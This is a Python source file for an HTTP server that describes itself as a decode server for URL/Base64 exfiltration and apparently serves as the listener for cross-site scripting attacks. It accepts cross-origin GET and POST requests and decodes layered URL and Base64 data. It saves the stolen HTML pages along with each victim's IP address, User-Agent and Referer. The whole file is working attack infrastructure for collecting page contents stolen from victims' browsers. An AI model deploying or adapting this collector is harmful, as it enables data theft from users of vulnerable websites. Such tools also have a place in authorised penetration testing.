#!/usr/bin/env python3
import http.server
import socketserver
import urllib.parse
import base64
import re
import sys
import os
import argparse
import threading
import json
import logging
from datetime import datetime, timezone

# --- Argument Parsing ---
parser = argparse.ArgumentParser(description='Decode server for URL/Base64 exfiltration')
parser.add_argument('--port', '-p', type=int, default=80, help='Port to listen on (default: 80)')
parser.add_argument('--show', '-s', action='store_true', help='Print decoded HTML to console')
parser.add_argument('--json-log', action='store_true', help='Enable JSON log output (to decoded_html/log.jsonl)')
parser.add_argument('--allow-ip', nargs='*', help='List of allowed IP addresses')
args = parser.parse_args()

# --- Configuration ---
PORT = args.port
SHOW_HTML = args.show
JSON_LOG = args.json_log
ALLOWED_IPS = set(args.allow_ip) if args.allow_ip else None
MAX_DEPTH = 5
SAVE_DIR = 'decoded_html'
BASE_DIR = os.path.abspath(os.path.dirname(__file__))
SAVE_PATH = os.path.join(BASE_DIR, SAVE_DIR)
LOG_FILE = os.path.join(SAVE_PATH, 'log.jsonl') if JSON_LOG else None

# --- Setup ---
os.makedirs(SAVE_PATH, exist_ok=True)
lock = threading.Lock()
logging.basicConfig(level=logging.INFO, format='[%(levelname)s] %(message)s')
log = logging.getLogger("xssrecv")

print(f"Working dir: {BASE_DIR}")
print(f"Saving decoded HTML to: {SAVE_PATH}")
print(f"Listening on port: {PORT}, show mode: {SHOW_HTML}, json log: {JSON_LOG}")

# Allow immediate socket reuse
socketserver.TCPServer.allow_reuse_address = True
socketserver.ThreadingTCPServer.allow_reuse_address = True

# --- Helpers ---
def fix_padding(b64_string):
    missing = len(b64_string) % 4
    if missing:
        b64_string += '=' * (4 - missing)
    return b64_string

def try_base64_decode(s: str):
    try:
        decoded = base64.b64decode(fix_padding(s))
        return decoded.decode('utf-8', errors='replace')
    except Exception:
        return None

def recursive_decode(data: str):
    """
    Recursively decode URL-encoding and Base64 layers up to MAX_DEPTH.
    Returns final data and list of (layer_type, snippet).
    """
    layers = []
    current = data
    for _ in range(MAX_DEPTH):
        url_decoded = urllib.parse.unquote(current)
        if url_decoded != current:
            layers.append(('url', url_decoded[:60]))
            current = url_decoded
            continue
        candidate = re.sub(r"\s+", "", current)
        if re.fullmatch(r'[A-Za-z0-9+/]{8,}={0,2}', candidate):
            b64_decoded = try_base64_decode(candidate)
            if b64_decoded is not None:
                layers.append(('b64', b64_decoded[:60]))
                current = b64_decoded
                continue
        break
    return current, layers

def save_html(content: str, timestamp: str):
    filename = os.path.join(SAVE_PATH, f'decoded_{timestamp}.html')
    try:
        with lock, open(filename, 'w', encoding='utf-8') as f:
            f.write(content)
        log.info(f"[+] Saved HTML: {filename}")
        return filename
    except Exception as e:
        log.warning(f"[!] Error saving HTML: {e}")
        return None

def save_raw(raw_data: str, timestamp: str):
    try:
        with lock, open(os.path.join(SAVE_PATH, f'raw_{timestamp}.txt'), 'w') as f:
            f.write(raw_data)
    except Exception as e:
        log.warning(f"Could not save raw data: {e}")

def save_json_log(entry: dict):
    if not JSON_LOG:
        return
    try:
        with lock, open(LOG_FILE, 'a', encoding='utf-8') as f:
            json.dump(entry, f)
            f.write('\n')
    except Exception as e:
        log.warning(f"Could not write to JSON log: {e}")

# --- Handler ---
class DecodeHandler(http.server.SimpleHTTPRequestHandler):
    def log_message(self, fmt, *args):
        log.info("%s - - [%s] %s", self.client_address[0], self.log_date_time_string(), fmt % args)

    def verify_request(self, request, client_address):
        return client_address[0] in ALLOWED_IPS if ALLOWED_IPS else True

    def end_headers(self):
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        super().end_headers()

    def do_OPTIONS(self):
        self.send_response(200)
        self.end_headers()

    def handle_data(self, raw_data: str):
        timestamp = datetime.now(timezone.utc).strftime('%Y%m%dT%H%M%SZ')
        key, sep, val = raw_data.partition('=')
        if not sep:
            log.warning(f"[!] Bad format: {raw_data}")
            return

        val = urllib.parse.unquote(val)
        log.info(f"[+] Raw ({key}): {val[:60]}{'...' if len(val)>60 else ''}")
        final, layers = recursive_decode(val)
        for i, (lt, snippet) in enumerate(layers, 1):
            log.info(f"    Layer {i} ({lt}): {snippet[:60]}{'...' if len(snippet)>60 else ''}")
        log.info(f"[+] Final length: {len(final)} chars")
        log.info(f"    Final preview: {final[:20]!r}")

        # Optional metadata
        entry = {
            "timestamp": timestamp,
            "ip": self.client_address[0],
            "headers": {
                "User-Agent": self.headers.get("User-Agent"),
                "Referer": self.headers.get("Referer")
            },
            "raw": raw_data[:120],
            "decoded_layers": layers,
            "final_preview": final[:120]
        }

        save_raw(raw_data, timestamp)

        if '<html' in final.lower() or '<!doctype' in final.lower():
            path = save_html(final, timestamp)
            entry["saved_html"] = path
            if SHOW_HTML:
                print("--- BEGIN DECODED HTML ---")
                print(final)
                print("--- END DECODED HTML ---")
        else:
            log.info("[!] Not HTML, skip saving.")
        save_json_log(entry)

    def do_POST(self):
        log.info(f"🔍 POST {self.path}")
        length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(length).decode('utf-8', errors='replace')
        log.info(f"    Body: {body[:100]}{'...' if len(body)>100 else ''}")
        self.handle_data(body)
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'Success')

    def do_GET(self):
        parsed = urllib.parse.urlsplit(self.path)
        filepath = parsed.path.lstrip('/')
        if filepath and os.path.isfile(os.path.join(BASE_DIR, filepath)):
            return super().do_GET()
        log.info(f"🔍 GET {self.path}")
        if parsed.query:
            self.handle_data(parsed.query)
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'Success')

    def do_HEAD(self):
        return self.do_GET()

# --- Main ---
if __name__ == '__main__':
    server = socketserver.ThreadingTCPServer(('0.0.0.0', PORT), DecodeHandler)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        log.info("KeyboardInterrupt received, shutting down server...")
    finally:
        server.shutdown()
        server.server_close()
        log.info("Server has exited cleanly.")

##
##
